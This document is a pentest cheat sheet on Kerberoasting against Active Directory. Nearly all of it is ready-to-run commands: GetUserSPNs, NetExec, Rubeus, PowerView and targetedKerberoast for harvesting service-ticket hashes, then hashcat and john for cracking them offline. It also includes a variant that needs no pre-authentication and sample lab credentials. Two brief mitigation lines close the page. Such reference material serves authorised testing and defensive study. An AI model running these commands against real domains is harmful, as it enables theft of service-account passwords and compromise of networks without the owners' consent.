# Roasting - Kerberoasting

> "A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - [MSDN](https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names)

Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.

- [SecureAuthCorp/impacket/GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from Impacket Suite

```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$424338c0a3c3af43[...]84fd2
```

- [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

```
netexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
```

- [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)

```
Rubeus.exe kerberoast /stats
Rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
Rubeus.exe kerberoast /tgtdeleg
Rubeus.exe kerberoast /rc4opsec
```

- [PowerShellMafia/PowerSploit/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)

```
Request-SPNTicket -SPN "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"
```

- [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)

```
targetedKerberoast.py [-h] [-v] [-q] [-D TARGET_DOMAIN] [-U USERS_FILE] [--request-user username] [-o OUTPUT_FILE] [--use-ldaps] [--only-abuse] [--no-abuse] [--dc-ip ip address] [-d DOMAIN] [-u USER] [-k] [--no-pass | -p PASSWORD | -H [LMHASH:]NTHASH | --aes-key hex key]
```

Hashcat modes:

| Mode | Description |
|---|---|
| `13100` | Kerberos 5 TGS-REP etype 23 (RC4) |
| `19600` | Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96) |
| `19700` | Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96) |

```
./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
```

## Kerberoasting Without Pre-Authentication

```
netexec ldap 10.10.10.10 -u username -p '' --no-preauth-targets users.txt --kerberoasting output.txt
```

## Mitigations

- Have a very long password for your accounts with SPNs (> 32 characters)
- Make sure no users have SPNs
